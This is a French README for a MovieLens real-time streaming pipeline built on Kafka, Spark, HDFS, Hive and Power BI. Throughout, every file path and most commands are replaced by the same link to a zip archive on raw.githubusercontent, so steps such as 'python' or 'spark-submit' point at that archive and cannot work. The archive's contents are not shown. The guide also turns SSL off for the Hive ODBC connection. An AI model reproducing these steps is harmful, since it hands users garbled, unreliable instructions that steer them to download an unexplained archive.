# Pipeline Big Data : Streaming Temps Réel (MovieLens)

Ce projet implémente la **Speed Layer** d'une Architecture Lambda pour analyser des notations de films en temps réel.

##rchitecture du Pipeline

1.  **Source** : Script Python (simule l'activité utilisateur).
2.  **Ingestion** : Logs locaux → Filebeat → Apache Kafka.
3.  **Traitement** : Apache Spark Structured Streaming (Enrichissement avec données Hive).
4.  **Stockage** : HDFS (Format Parquet).
5.  **Visualisation** : Hive (Table externe) → Power BI (ODBC).

##  Structure du projet

*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Générateur de trafic (écrit dans `/tmp/streaming_movies/`).
*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Job Spark Streaming (lit Kafka, écrit dans HDFS).
*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Configuration de l'agent de collecte.
*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Configuration du serveur Hive (Mode HTTP/Binaire).

---

##  Guide de Démarrage (Étape par Étape)

Suivez cet ordre précis pour lancer l'environnement complet.

### 1. Démarrage de l'Infrastructure (Hadoop & Kafka)

Dans un terminal WSL :


# 1. Démarrer HDFS et YARN
https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip

# 2. Sortir du Safe Mode (Si nécessaire après redémarrage)
hdfs dfsadmin -safemode leave

# 3. Démarrer Zookeeper (Coordinateur Kafka)
https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip -daemon https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip

# 4. Démarrer le Broker Kafka
https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip -daemon https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
2. Démarrage du Serveur Hive (Pour Power BI)
C'est le composant qui permet à Power BI de lire les données.

# Lancer HiveServer2 en arrière-plan
# (Attendre 2-3 minutes qu'il soit prêt sur le port 10000 ou 10001)
/opt/hive/bin/hiveserver2 &
3. Initialisation de la Table Hive
Si c'est la première fois, ou pour réinitialiser la vue :
SQL
-- Lancer la commande 'hive' puis :
DROP TABLE IF EXISTS clean_ratings;

CREATE EXTERNAL TABLE clean_ratings (
    user_id INT,
    movie_id INT,
    rating INT,
    `timestamp` BIGINT,
    title STRING
)
STORED AS PARQUET
LOCATION '/tmp/streaming_project/results/clean_ratings';
4. Lancement du Streaming (3 Terminaux distincts)
Terminal 1 : Le Producteur (Génération de données)
source venv/bin/activate
# Créer le dossier de logs local s'il n'existe pas
mkdir -p /tmp/streaming_movies
# Lancer le script
python https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
Terminal 2 : Filebeat (Transport vers Kafka)

# Se placer dans le dossier d'installation de Filebeat
./filebeat -e -c https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
Terminal 3 : Spark Streaming (Traitement ETL)
source venv/bin/activate
# Nettoyage optionnel avant lancement
hdfs dfs -rm -r -f /tmp/streaming_project/results/clean_ratings
hdfs dfs -rm -r -f /tmp/streaming_project/checkpoints

# Lancer le job Spark
spark-submit https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
Visualisation dans Power BI
Installer le Microsoft Hive ODBC Driver.
Ouvrir Power BI > Obtenir les données > ODBC.
Utiliser la chaîne de connexion suivante pour contourner le SSL :
dsn=Hive movies;EnableSSL=0

